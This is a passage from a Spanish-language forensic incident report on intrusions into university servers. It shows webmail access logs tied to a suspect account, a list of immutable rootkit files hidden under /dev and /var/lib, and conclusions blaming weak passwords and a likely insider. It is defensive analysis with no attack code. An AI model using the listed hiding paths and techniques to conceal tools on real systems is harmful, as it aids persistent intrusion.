	<001400a4dc53$edc46848$82555406@yrhvthn.idf>, <E192xDa-0006UU-00@victima2.foo.bar.mx>, 
	<000500c1cc51$cae25126$16160505@aijxrxt.igo>, <939d2a15d64b$0a5fd7b6$adc946c7@vmaefijpcqlxb.u>
Tue Apr  8 15:07:42 2003 - [31717] (200.78.118.87) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Tue Apr  8 15:07:42 2003 - [31717] (200.78.118.87) duende - logout - duende-session-0.0548009612402929
Tue Apr  8 18:26:38 2003 - [24272] (200.64.234.231) duende - login - duende-session-0.413941692401753
Tue Apr  8 18:31:04 2003 - [19405] (200.64.234.231) duende - logout - duende-session-0.413941692401753
Tue Apr  8 19:21:27 2003 - [18752] (200.78.118.87) duende - login - duende-session-0.00811091747982928
Tue Apr  8 19:22:24 2003 - [17934] (200.78.118.87) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<20030408221438.DRGV16092.apk01fe3@jcsalgado>, 
	<200304081814.LAA38257@s3085.mb00.net>
Tue Apr  8 19:23:03 2003 - [2031] (200.78.118.87) duende - logout - duende-session-0.00811091747982928
Tue Apr  8 19:23:06 2003 - [31674] (200.78.118.87) duende - session error - session 
	duende-session-0.00811091747982928 timeout access attempt
Tue Apr  8 19:24:44 2003 - [821] (200.78.118.87) duende - login - duende-session-0.589333394616009
Tue Apr  8 19:26:58 2003 - [15200] (200.78.118.87) duende - logout - duende-session-0.589333394616009
Fri Apr 11 07:04:14 2003 - [10496] (200.67.75.91) duende - login - duende-session-0.293154917731048
Fri Apr 11 07:04:43 2003 - [32039] (200.67.75.91) duende - movemsg - move 8 msgs from INBOX to mail-trash 
	- ids=<E193ygk-0002Hk-00@victima2.foo.bar.mx>, <E193xZY-0001zO-00@victima2.foo.bar.mx>, 
	<001510d4ad31$ebe46627$75741578@tvkwrgy.yuw>, <E193wEY-0001m8-00@victima2.foo.bar.mx>, 
	<23142599-2200345110522920@archivos>, <d696f6e57736$4f1f89e6$3933b5e4@cbnu.jvc>, 
	<E193tAJ-0002UY-02@sc8-osdn-mail.osdn.com>, <E193teF-0001Qn-00@victima2.foo.bar.mx>
Fri Apr 11 07:04:56 2003 - [6634] (200.67.75.91) duende - movemsg - move 5 msgs from INBOX to mail-trash 
	- ids=<E193tYC-0001Oe-00@victima2.foo.bar.mx>, <1050045034.29031@moses.rbmailsystems.com>, 
	<E193rAL-0002MQ-00@sc8-osdn-mail.osdn.com>, <200304110436.h3B4aKN24204@host.dbrainshost.com>, 
	<E193qBi-0000wn-00@victima2.foo.bar.mx>
Fri Apr 11 07:05:25 2003 - [28139] (200.67.75.91) duende - movemsg - move 2 old msgs from INBOX to 
	saved-messages
Fri Apr 11 07:05:25 2003 - [28139] (200.67.75.91) duende - logout - duende-session-0.293154917731048
Fri Apr 11 12:25:10 2003 - [9172] (200.67.75.124) duende - login - duende-session-0.202930265179933
Fri Apr 11 12:25:26 2003 - [1219] (200.67.75.124) duende - movemsg - move 5 msgs from INBOX to mail-trash 
	- ids=<324652713521200@mail.yahoo.com>, <15601668828978@mail.yahoo.com>, 
	<JmBWO.Kvc@4glKL2i2BAvUuD>, <001011b6ed30$eeb65077$15104471@odptvbu.lsk>, 
	<001210c2cc80$cdd34418$47436247@tscvfpx.wtb>
Fri Apr 11 12:25:30 2003 - [510] (200.67.75.124) duende - logout - duende-session-0.202930265179933
Fri Apr 11 14:57:13 2003 - [25179] (200.67.75.124) duende - login - duende-session-0.773262013987736
Fri Apr 11 14:57:14 2003 - [3007] (200.67.75.124) duende - delmsg - delete 26 msgs from mail-trash
Fri Apr 11 14:57:26 2003 - [27002] (200.67.75.124) duende - movemsg - move 4 msgs from INBOX to 
	mail-trash - ids=<15664107433474@mail.yahoo.com>, <267671417810412@mail.yahoo.com>, 
	<001110c0ac33$eca35746$81687176@edvjmtn.grj>, <10fb11010f5f2d.10f5f2d10fb110@terra.com.ar>
Fri Apr 11 14:57:31 2003 - [7722] (200.67.75.124) duende - logout - duende-session-0.773262013987736
Fri Apr 11 19:18:21 2003 - [25052] (200.67.75.124) duende - login - duende-session-0.449964438871579
Fri Apr 11 19:18:41 2003 - [24926] (200.67.75.124) duende - movemsg - move 3 msgs from INBOX to 
	mail-trash - ids=<000110c4ae14$dee11418$56280400@tdxcugj.uwh>, 
	<d05d608cde53$549f91e3$c668aa33@alnmarpihg.qpwt>, <E1946rm-0003wg-00@victima2.foo.bar.mx>
Fri Apr 11 19:18:45 2003 - [12553] (200.67.75.124) duende - logout - duende-session-0.449964438871579
Sat Apr 12 07:14:42 2003 - [31624] (200.67.75.69) duende - login - duende-session-0.440158888771297
Sat Apr 12 07:15:32 2003 - [29021] (200.67.75.69) duende - movemsg - move 7 msgs from INBOX to mail-trash
	 - ids=<R8RIS.A9Xxo@J>, <E194FIE-0004oQ-01@sc8-osdn-mail.osdn.com>, 
	 <E194DMl-0005Wo-01@sc8-osdn-mail.osdn.com>, <4120-2200346124480379@Pablo>, 
	 <1050122714.5245@moses.rbmailsystems.com>, <E194B5K-0004im-00@victima2.foo.bar.mx>, 
	 <8547724.1050111107652.JavaMail.eb@mr>
Sat Apr 12 07:15:52 2003 - [20907] (200.67.75.69) duende - logout - duende-session-0.440158888771297
Sat Apr 12 11:36:27 2003 - [29454] (200.67.75.69) duende - login - duende-session-0.687636374103935
Sat Apr 12 11:36:35 2003 - [4362] (200.67.75.69) duende - movemsg - move 1 msgs from INBOX to mail-trash 
	- ids=<50959b44f05b$0e5960af$b9d035ed@otsfpxhcjcobtr.oxe>
Sat Apr 12 11:36:37 2003 - [7248] (200.67.75.69) duende - logout - duende-session-0.687636374103935
Sat Apr 12 14:30:29 2003 - [16567] (200.67.75.2) duende - session cleanup - 
	claudia-session-0.724683788911538
Sat Apr 12 14:30:29 2003 - [16567] (200.67.75.2) duende - session cleanup - 
	mary-session-0.171283690798194
Sat Apr 12 14:30:29 2003 - [16567] (200.67.75.2) duende - login - duende-session-0.629152196533145
Sat Apr 12 14:30:39 2003 - [14434] (200.67.75.2) duende - movemsg - move 3 msgs from INBOX to mail-trash 
	- ids=<F.CO@PAYCwgT3>, <1050177660.9499@localhost.localdomain>, <6waf.2i7@xA56>
Sat Apr 12 14:30:41 2003 - [12718] (200.67.75.2) duende - logout - duende-session-0.629152196533145
Sat Apr 12 20:28:54 2003 - [2920] (200.67.75.119) duende - login - duende-session-0.212671121656062
Sat Apr 12 20:28:56 2003 - [13892] (200.67.75.119) duende - delmsg - delete 22 msgs from mail-trash
Sat Apr 12 20:29:28 2003 - [32663] (200.67.75.119) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<1050186334.6743@moses.rbmailsystems.com>, <HitIu.f@PWAokZz0iZlu>
Sat Apr 12 20:29:34 2003 - [11084] (200.67.75.119) duende - logout - duende-session-0.212671121656062
Tue Apr 15 07:08:58 2003 - [525] (200.78.118.156) duende - login - duende-session-0.63886112191631
Tue Apr 15 07:08:59 2003 - [20809] (200.78.118.156) duende - delmsg - delete 28 msgs from mail-trash
Tue Apr 15 07:09:20 2003 - [27751] (200.78.118.156) duende - movemsg - move 8 msgs from INBOX to 
	mail-trash - ids=<ox2u4h24o36fa.4hxxmc3t884v9m.mpdcat@aol.com>, 
	<E195Lp4-0007en-00@victima2.foo.bar.mx>, <E195L3F-0003OK-00@sc8-osdn-mail.osdn.com>, 
	<7b9174765f8d$ff449538$66c93516@qjwoafokp.alif>, 
	<c4e031cbd622$50240661$eabcb498@rbjiwjykpdlgvt.ya>, <E195Isp-0004Co-02@sc8-osdn-mail.osdn.com>, 
	<1050375035.19638@moses.rbmailsystems.com>, <1050374628.6010@localhost.localdomain>
Tue Apr 15 07:09:53 2003 - [28749] (200.78.118.156) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Tue Apr 15 07:09:53 2003 - [28749] (200.78.118.156) duende - logout - duende-session-0.63886112191631
Tue Apr 15 12:10:01 2003 - [29056] (200.78.118.156) duende - login - duende-session-0.314887144443677
Tue Apr 15 12:10:24 2003 - [21530] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E195TmA-0000Re-00@victima2.foo.bar.mx>
Tue Apr 15 12:10:29 2003 - [27592] (200.78.118.156) duende - logout - duende-session-0.314887144443677
Tue Apr 15 17:41:26 2003 - [12325] (200.78.118.156) duende - login - duende-session-0.290309090706618
Tue Apr 15 17:41:40 2003 - [3563] (200.78.118.156) duende - movemsg - move 4 msgs from INBOX to 
	mail-trash - ids=<200304151819.LAA83729@s3061.mb00.net>, 
	<22dabfcaf19b$b5e52d2b$8a1a0ce2@idqmvavjekqw.nsd>, <db178c4c6758$776a81c9$671d04d3@ifxxx.gm>, 
	<E195Wwa-0000jN-00@victima2.foo.bar.mx>
Tue Apr 15 17:41:43 2003 - [21231] (200.78.118.156) duende - logout - duende-session-0.290309090706618
Tue Apr 15 18:16:48 2003 - [29400] (200.78.118.156) duende - login - duende-session-0.372129243173735
Tue Apr 15 18:16:57 2003 - [1111] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<quJ.9l@cTFKfcdVe>
Tue Apr 15 18:58:30 2003 - [17611] (200.78.118.156) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<33b120057588$a0b98596$c0bcfdab@joy.holq>, 
	<e76a7056cb1d$7ca3c065$4d7589d1@qqrubr.bv>
Tue Apr 15 19:06:02 2003 - [13538] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<899ae3e888f3$df31c7dd$a932fd4f@gernusjrqb.mw>
Tue Apr 15 19:48:41 2003 - [13466] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX 
	to mail-trash - ids=<1050456634.26059@moses.rbmailsystems.com>
Tue Apr 15 20:11:21 2003 - [8723] (200.78.118.156) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<E195cCA-0004fZ-00@mx01.africaonline.com.na>, 
	<00004e9d1a5b$0000115f$00001adf@mx14.hotmail.com>
Tue Apr 15 20:11:26 2003 - [17662] (200.78.118.156) duende - logout - duende-session-0.372129243173735
Tue Apr 15 20:20:01 2003 - [7714] (200.78.118.156) duende - login - duende-session-0.634861625106172
Tue Apr 15 20:20:07 2003 - [24480] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E195d7M-0001xN-00@victima2.foo.bar.mx>
Tue Apr 15 20:34:36 2003 - [21761] (200.78.118.156) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<189b77f9c21d$d0abdf57$df26df44@ld.u>
Tue Apr 15 20:34:39 2003 - [16970] (200.78.118.156) duende - logout - duende-session-0.634861625106172
Tue Apr 15 21:56:40 2003 - [5924] (200.78.118.156) duende - login - duende-session-0.887087376861931
Tue Apr 15 21:56:44 2003 - [12058] (200.78.118.156) duende - logout - duende-session-0.887087376861931
Wed Apr 16 05:40:35 2003 - [2371] (200.78.118.61) duende - login - duende-session-0.361576188196526
Wed Apr 16 05:40:58 2003 - [19087] (200.78.118.61) duende - movemsg - move 9 msgs from INBOX to 
	mail-trash - ids=<26411975_33_18@supersaver.onlinegreatsavings.com>, 
	<7e9a1e5c455b$320b65c3$cc4e38e2@vmaeqjwdost.ugik>, <7f159dab3337$adaf4c29$81ef5181@g.mqlk>, 
	<26411981_33_18@supersaver.onlinegreatsavings.com>, <E195ktl-0003E4-00@victima2.foo.bar.mx>, 
	<001200a8ca85$aee70247$65575866@samtlgl.cch>, <7a519cb76e8f$a66f89c4$c9a84188@ymjvxumqnre.n>, 
	<16dc5dffd81c$6002d0d5$836d0f80@txfebhxcqhg.v>, <200304160714.h3G7EeC25773@host.dbrainshost.com>
Wed Apr 16 05:41:28 2003 - [3839] (200.78.118.61) duende - movemsg - move 6 msgs from INBOX to 
	mail-trash - ids=<E195hqV-0003b1-00@sc8-osdn-mail.osdn.com>, <3ea05004aba8$11ece546$15bda0be@j.yrnr>, 
	<E195fjV-0001W2-00@sc8-osdn-mail.osdn.com>, <7408bd367259$d932b5d1$79503fbd@ofaywwhxaqpk.n>, 
	<a55080d6582c$c8480ba6$d0725226@upuxsbpn.xpe>, <GMI-NT-DB-1Y4kJSFsx000442eb@cw11.gmi-mr.com>
Wed Apr 16 05:41:43 2003 - [1299] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<4c7a7eb97e33$c6a9c6e0$d30ecb9f@hcovm.mrcl>
Wed Apr 16 05:42:17 2003 - [16176] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E195hNN-0002id-00@victima2.foo.bar.mx>
Wed Apr 16 05:42:20 2003 - [10465] (200.78.118.61) duende - logout - duende-session-0.361576188196526
Wed Apr 16 06:30:06 2003 - [19147] (200.78.118.61) duende - login - duende-session-0.297856118138046
Wed Apr 16 06:30:10 2003 - [14498] (200.78.118.61) duende - logout - duende-session-0.297856118138046
Wed Apr 16 06:46:08 2003 - [3954] (200.78.118.61) duende - login - duende-session-0.539828403693722
Wed Apr 16 06:52:12 2003 - [4334] (200.78.118.61) duende - logout - duende-session-0.539828403693722
Wed Apr 16 07:08:45 2003 - [8927] (200.78.118.61) duende - login - duende-session-0.609954713451774
Wed Apr 16 07:09:10 2003 - [24015] (200.78.118.61) duende - delmsg - delete 16 msgs from mail-trash
Wed Apr 16 07:09:10 2003 - [24015] (200.78.118.61) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Wed Apr 16 07:09:10 2003 - [24015] (200.78.118.61) duende - logout - duende-session-0.609954713451774
Wed Apr 16 07:09:17 2003 - [23878] (200.78.118.61) duende - login - duende-session-0.958217004853399
Wed Apr 16 07:43:26 2003 - [9725] (200.78.118.61) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Wed Apr 16 07:43:26 2003 - [9725] (200.78.118.61) duende - logout - duende-session-0.958217004853399
Wed Apr 16 07:44:54 2003 - [7362] (200.78.118.61) duende - login - duende-session-0.756916272294806
Wed Apr 16 07:45:06 2003 - [27273] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<542f2d84a473$4c35ab65$eb7d94a4@bhxk.h>
Wed Apr 16 07:45:09 2003 - [14655] (200.78.118.61) duende - logout - duende-session-0.756916272294806
Wed Apr 16 09:06:46 2003 - [26718] (200.78.118.61) duende - login - duende-session-0.26242228674619
Wed Apr 16 09:07:57 2003 - [3768] (200.78.118.61) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<E195p9v-0003v6-00@victima2.foo.bar.mx>, 
	<18ba0be6ce91$ae94ade2$90673715@dgqnofidujv.nu>
Wed Apr 16 09:15:02 2003 - [16309] (200.78.118.61) duende - logout - duende-session-0.26242228674619
Wed Apr 16 11:26:18 2003 - [18649] (200.78.118.61) duende - login - duende-session-0.233694151350395
Wed Apr 16 11:26:24 2003 - [18201] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<000601a0bd18$daa43620$48515581@hgcgsbk.eex>
Wed Apr 16 11:26:26 2003 - [31037] (200.78.118.61) duende - logout - duende-session-0.233694151350395
Wed Apr 16 14:34:23 2003 - [22554] (200.78.118.61) duende - login - duende-session-0.567744005079479
Wed Apr 16 14:34:24 2003 - [17527] (200.78.118.61) duende - filtermsg - filter 1 msgs from INBOX
Wed Apr 16 14:34:29 2003 - [28060] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E195tql-0000tw-00@victima2.foo.bar.mx>
Wed Apr 16 14:34:38 2003 - [382] (200.78.118.61) duende - logout - duende-session-0.567744005079479
Wed Apr 16 17:59:04 2003 - [31213] (200.78.118.61) duende - login - duende-session-0.055406087617488
Wed Apr 16 17:59:17 2003 - [21318] (200.78.118.61) duende - movemsg - move 4 msgs from INBOX to 
	mail-trash - ids=<E195wn3-0000TV-00@victima2.foo.bar.mx>, 
		<E195vl8-0000kY-00@victima1.com>, <2003416173530.h3GMZUd06803@mpmlbx04>, 
		<1050528655.30148@moses.rbmailsystems.com>
Wed Apr 16 17:59:32 2003 - [18571] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<200304161423805.SM00912@127.0.0.1>
Wed Apr 16 17:59:33 2003 - [21483] (200.78.118.61) duende - logout - duende-session-0.055406087617488
Wed Apr 16 20:09:12 2003 - [6332] (200.78.118.61) duende - login - duende-session-0.266070793922157
Wed Apr 16 20:09:18 2003 - [5016] (200.78.118.61) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<200304170027.RAA26201@fmailc2.real-net.net>
Wed Apr 16 20:09:20 2003 - [10068] (200.78.118.61) duende - logout - duende-session-0.266070793922157
Fri Apr 18 06:19:18 2003 - [21990] (200.78.118.131) duende - login - duende-session-0.84744522867641
Fri Apr 18 06:19:38 2003 - [19155] (200.78.118.131) duende - movemsg - move 10 msgs from INBOX to 
	mail-trash - ids=<d3132d4ab941$b1c39858$c73cda6d@hugefist.com>, 
	<E196QbZ-0008J4-02@sc8-osdn-mail.osdn.com>, <E196QTQ-00059M-00@victima2.foo.bar.mx>, 
	<ec5293befc7a$4a44966e$63a96768@e.cfje>, <b7234b01fb37$7db48430$cd01d25a@cgtljhg.e>, 
	<E196OaJ-0006RR-01@sc8-osdn-mail.osdn.com>, <88b6ed61abc0$f7eefd1c$ad2bd2eb@eagcta.djv>, 
	<032103.00001.AKLJGHDBkldsgfbklagdkla.LJHGVjb@netgui.com>, <c6815f89811d$f30aabc1$ee288c65@s.d>, 
	<00000c861f8a$000020fe$00004e56@hotmail.com>
Fri Apr 18 06:19:41 2003 - [19771] (200.78.118.131) duende - logout - duende-session-0.84744522867641
Fri Apr 18 08:00:40 2003 - [17670] (200.78.118.131) duende - login - duende-session-0.35051374214618
Fri Apr 18 08:01:01 2003 - [1284] (200.78.118.131) duende - movemsg - move 4 msgs from INBOX to 
	mail-trash - ids=<3249694-220034417223050489@archivos>, <E196Wem-0006Cv-00@victima2.foo.bar.mx>, 
	<E196Vvs-00065B-00@victima2.foo.bar.mx>, <E196Uu0-0004pC-00@victima1.com>
Fri Apr 18 08:02:24 2003 - [13979] (200.78.118.131) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Fri Apr 18 08:02:24 2003 - [13979] (200.78.118.131) duende - logout - duende-session-0.35051374214618
Fri Apr 18 09:58:48 2003 - [11646] (200.78.118.131) duende - login - duende-session-0.297412874250771
Fri Apr 18 09:58:54 2003 - [26219] (200.78.118.131) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E196Xh5-0006LQ-00@victima2.foo.bar.mx>
Fri Apr 18 10:00:30 2003 - [24003] (200.78.118.131) duende - logout - duende-session-0.297412874250771
Fri Apr 18 12:56:22 2003 - [27820] (200.78.118.131) duende - login - duende-session-0.858990246503712
Fri Apr 18 12:56:23 2003 - [14967] (200.78.118.131) duende - delmsg - delete 27 msgs from mail-trash
Fri Apr 18 12:56:38 2003 - [27235] (200.78.118.131) duende - logout - duende-session-0.858990246503712
Fri Apr 18 19:37:55 2003 - [31189] (200.78.118.131) duende - login - duende-session-0.804238992816867
Fri Apr 18 19:38:18 2003 - [2103] (200.78.118.131) duende - movemsg - move 6 msgs from INBOX to 
	mail-trash - ids=<5834609.1050711608268.JavaMail.eb@mr>, <eb9bd526dc21$2cc1be97$d0cf902b@nf.w>, 
	<07b952988938$3aa513f4$cc8d9e80@pmwh.sk>, <200304181951.h3IJpsYq014492@fmaila3.real-net.net>, 
	<1050691837.6965@moses.rbmailsystems.com>, <d2a2417ec262$82146f7c$7a13a15a@uxw.kst>
Fri Apr 18 19:38:25 2003 - [13129] (200.78.118.131) duende - logout - duende-session-0.804238992816867
Fri Apr 18 22:38:50 2003 - [7404] (200.78.118.131) duende - login - duende-session-0.438316993023367
Fri Apr 18 22:39:48 2003 - [1039] (200.78.118.131) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Fri Apr 18 22:39:48 2003 - [1039] (200.78.118.131) duende - logout - duende-session-0.438316993023367
Tue Apr 22 06:15:53 2003 - [25100] (200.78.118.98) duende - login - duende-session-0.827616890267567
Tue Apr 22 06:16:18 2003 - [28042] (200.78.118.98) duende - movemsg - move 8 msgs from INBOX to 
	mail-trash - ids=<FGEEJGKKBHJCACFCEOCKKEBJCCAA.tpn@hotmail.com>, 
	<E197szM-0007dx-04@sc8-osdn-mail.osdn.com>, 
	<MASAKARI3lrGS1DknvC00000afc@masakari.prometheus.co.uk>, <4300179898419@mail.yahoo.com>, 
	<1301326115292@mail.yahoo.com>, <E197qel-00048R-01@sc8-osdn-mail.osdn.com>, 
	<26GL9I.7MLX8D19OM1UQ7XW3S4."Lanzamientos Mexico Palm ahora"<dimovadaria1980@mail.ru>>, 
	<E197nRp-00024F-00@victima2.foo.bar.mx>
Tue Apr 22 06:16:23 2003 - [3511] (200.78.118.98) duende - logout - duende-session-0.827616890267567
Tue Apr 22 06:16:37 2003 - [14858] (200.78.118.98) duende - login - duende-session-0.77603169049053
Tue Apr 22 06:17:32 2003 - [23648] (200.78.118.98) duende - logout - duende-session-0.77603169049053
Tue Apr 22 06:23:16 2003 - [26219] (200.78.118.98) duende - login error - -4 - loginname=duende
Tue Apr 22 06:23:45 2003 - [8283] (200.78.118.98) duende - login error - -4 - loginname=duende
Tue Apr 22 06:24:03 2003 - [11404] (200.78.118.98) duende - login - duende-session-0.619109115404175
Tue Apr 22 06:24:29 2003 - [1888] (200.78.118.98) duende - movemsg - move 1 msgs from saved-messages to 
	mail-trash - ids=<E196i5M-0007sq-00@victima2.foo.bar.mx>
Tue Apr 22 06:24:42 2003 - [27087] (200.78.118.98) duende - logout - duende-session-0.619109115404175
Tue Apr 22 09:13:33 2003 - [15353] (200.78.118.98) duende - login - duende-session-0.804237188612209
Tue Apr 22 09:13:35 2003 - [27584] (200.78.118.98) duende - filtermsg - filter 3 msgs from INBOX
Tue Apr 22 09:37:50 2003 - [415] (200.78.118.98) duende - movemsg - move 5 msgs from INBOX to 
	mail-trash - ids=<001210a1aa04$aed80085$14340155@whdrumd.fxo>, 
	<FGEEJGKKBHJCACFCEOCKKEBJCCAA.tpn@mail.com>, <000110d2ec83$bcd68805$62175583@bierxcx.jfr>, 
	<E197yL7-0002S3-00@victima2.foo.bar.mx>, <jv0QE.QOvkL8@r>
Tue Apr 22 09:37:59 2003 - [4169] (200.78.118.98) duende - logout - duende-session-0.804237188612209
Tue Apr 22 11:56:42 2003 - [30704] (200.78.118.98) duende - login - duende-session-0.669937722691433
Tue Apr 22 11:56:50 2003 - [2897] (200.78.118.98) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<200304221417.HAA58523@s3062.mb00.net>, <200304221419.HAA46889@s3057.mb00.net>
Tue Apr 22 11:58:03 2003 - [21150] (200.78.118.98) duende - logout - duende-session-0.669937722691433
Tue Apr 22 15:11:53 2003 - [14591] (200.78.118.98) duende - login - duende-session-0.693460366762341
Tue Apr 22 15:12:05 2003 - [6175] (200.78.118.98) duende - movemsg - move 5 msgs from INBOX to 
	mail-trash - ids=<E1985bi-0002ru-00@victima2.foo.bar.mx>, <2003422152748.h3MKRmO13795@mpmlbx10>, 
	<6924985dd293$a62a6696$61aeee19@hqdvipvavlffx.axb>, <E1983t0-0002ii-00@victima2.foo.bar.mx>, 
	<1051034740.28257@moses.rbmailsystems.com>
Tue Apr 22 15:12:08 2003 - [9076] (200.78.118.98) duende - logout - duende-session-0.693460366762341
Tue Apr 22 16:52:02 2003 - [29842] (200.78.118.98) duende - login - duende-session-0.269443440091894
Tue Apr 22 16:52:07 2003 - [16282] (200.78.118.98) duende - logout - duende-session-0.269443440091894
Tue Apr 22 18:57:43 2003 - [30686] (200.78.118.98) duende - login - duende-session-0.0720823633755607
Tue Apr 22 19:00:55 2003 - [19319] (200.78.118.98) duende - movemsg - move 2 msgs from INBOX to 
	mail-trash - ids=<20030423005950.YHTP28651.apk01fe2@GERENCIA>, 
	<200304230036.h3N0aZr14036@grupokreativo.com>
Tue Apr 22 19:01:01 2003 - [13036] (200.78.118.98) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Tue Apr 22 19:01:01 2003 - [13036] (200.78.118.98) duende - logout - duende-session-0.0720823633755607
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Los registros anteriores muestran que el usuario duende si es quien
efectivamente accesaba a la cuenta de \verb+victima2+ y desde ahi hacia \verb+victima1+,
los n'umeros de ip de las m'aquinas concuerdan con los dem'as registros
vistos anteriormente. El acceso a la cuenta de correo y su actividad
dentro de ella muestra que el usuario en verdad estaba leyendo y
enviando correo. Actividad muy rara esta de responder y ordenarle el
correo a aquel a quien se le esta usurpando su identidad. Tambi'en se tiene
registro del origen y destino del correo adem'as la posibilidad de
revisar su contenido, pero esto no tiene importancia para este caso, solo
se necesitan los tiempos de acceso y origen de la conexi'on para poder
correlacionar los eventos.


\subsection*{Atributos especiales en archivos del sistema}


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-u--ia----------- /usr/lib/popclean
-u--ia----------- /usr/local/lib/dsniff.services
-u--ia----------- /etc/cron.daily/dnsquery
-u--ia----------- /var/lib/.identd/libs
-u--ia----------- /var/lib/.identd/identd
-u--ia----------- /var/lib/.identd/libdn
-u--ia----------- /var/lib/.identd/libsnd
-u--ia----------- /dev/rd/c2d3b2
-u--ia----------- /dev/rd/c6d0b2
-u--ia----------- /dev/rd/c6d3b2
-u--ia----------- /dev/.libn
-u--ia----------- /dev/.libpt
-u--ia----------- /dev/.libtr
-u--ia----------- /dev/.libtp
-u--ia----------- /dev/.pst
-u--ia----------- /dev/.nst
-u--ia----------- /dev/.tree
-u--ia----------- /dev/.tp

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm


El atributo {\bf i} indica que los archivos anteriores no pueden ser
modificados o borrados por nadie. Estos atributos son conocidos por
muy pocas personas y un atacante no experimentado por lo general no
los sabe usar, pero son comunes cuando alguien instala un {\bf rootkit}
empaquetado o compilado en el sistema que se esta atacando.


\subsection*{Conclusiones}

La evidencia es muy clara y muestra que existieron varias
intrusiones. El punto principal de acceso al equipo fue por el
servicio \verb+ftp+, pero este no fue el 'unico blanco, tambi'en se trato de
explotar el servicio \verb+samba+ y \verb+nfs+. La causa principal de este tipo de
intrusiones es la pobre elecci'on de claves de acceso por parte de los
usuarios. Se encontr'o que en alguna ocasi'on las cuentas de los
usuarios \verb+xxxxx+, \verb+xxxxxx+ y \verb+xxxxxxxx+ fueron objeto de intrusi'on debido a
la facilidad de adivinar sus claves. La implantaci'on de servidores
\verb+ftp+ e {\bf irc} son cosa muy com'un en este tipo de ataques y son
resueltos con gran facilidad cuando se cierra el acceso a las cuentas
involucradas y se cambian los passwords. El periodo que los intrusos
mantienen activos los servicios sembrados es corto y es extra�o que
hayan permanecido tanto tiempo en activo. El objetivo principal de
estos intrusos es dar servicios y pasar desapercibidos sin extraer
informaci'on ni causar perjuicio alguno.

 Los directorios y archivos en \verb+/dev+ muestran otro ataque al parecer
independiente y posterior al de los {\bf irc}. El objetivo principal de este segundo ataque era
obtener control del equipo, conocer los passwords de root si estos
fueran cambiados, y saber informaci'on confidencial de los usuarios. Este es
el ataque de alguien que quer'ia saber lo que estaba ocurriendo en el
servidor y no perder su control si se hac'ian cambios. El inicio de este ataque coincide con los reemplazos de
passwords de root en todas las m'aquinas a cargo del administrador. Es
despu'es de estos cambios que aparecen las primeras evidencias de espionaje y del deseo de
conocer las claves de administraci'on de los servidores. Es posible que
el descubrir la intrusi'on del {\bf irc}, haya animado a un atacante interno
a realizar sus propias acciones protegido bajo el manto de la
confusi'on que podr'ia causar el ataque e intrusi'on originales.

 La obtenci'on de {\bf rootkits} es relativamente sencilla, pero al momento
de instalarlos pueden ocurrir errores que impidan la correcta fijaci'on
de los atributos de estos. Es as'i que cualquier cambio en el orden de
instalaci'on puede llevar a resultados muy diferentes, como la
conservaci'on de los propietarios originales y la posterior
imposibilidad de hacer modificaciones o inculpar a otros usuarios como
en este caso. Este ataque es claramente perpetrado por alguien de poca
experiencia en el {\em cracking} a diferencia de los ataques usuales de
siembra de {\bf irc} con que el administrador se ha encontrado en muy
diversas ocasiones en servidores distribuidos por todo el pa'is. Parece ser que las acciones se salieron del
control del intruso y solo revisaba que no hubiera sido descubierto.

Despu'es de estudiar cada una de las m'aquinas a cargo del
administrador, se encontr'o que el inter'es 'unico del atacante era tener
control de victima2, victima1 e io, estos son los servidores
principales, pero existen otros menos importantes pero con gran
actividad. El atacante sabia cuales eran los equipos y conoc'ia su
ubicaci'on f'isica. Despu'es de checar varias m'aquinas de la subred se
verific'o que no hab'ia ataques ni intrusiones en equipos fuera del
edificio donde est'an los sistemas estudiados. Cabe mencionar que un
atacante externo no tiene forma de conocer la ubicaci'on f'isica de los
equipos y mucho menos conocer la relaci'on entre ellos. El atacante
sabia cuales eran las m'aquinas y as'i lo muestran los registros. Varias
de las m'aquinas fuera de la universidad que han estado comprometidas
por efecto de este ataque ya han sido reportadas a sus respectivos
administradores, y las que no lo est'an ser'an reportadas a la brevedad.

 La actividad mostrada por el usuario duende indica el conocimiento
de la existencia de la intrusi'on y la posesi'on de muchos de los
programas involucrados en el ataque. La ejecuci'on de estos programas
en el sistema y el acceso y revisi'on de informaci'on confidencial o
comprometida es ya de por si nefasta, pero el intento de eliminaci'on
de evidencia cuando trata de cambiar el propietario de estos programas
de duende a root deja en claro la autor'ia o complicidad con el
ataque.

 Para la administraci'on y la Comisi'on de C'omputo, no hay diferencia
alguna entre un posible atacante original y la cuenta duende pues la
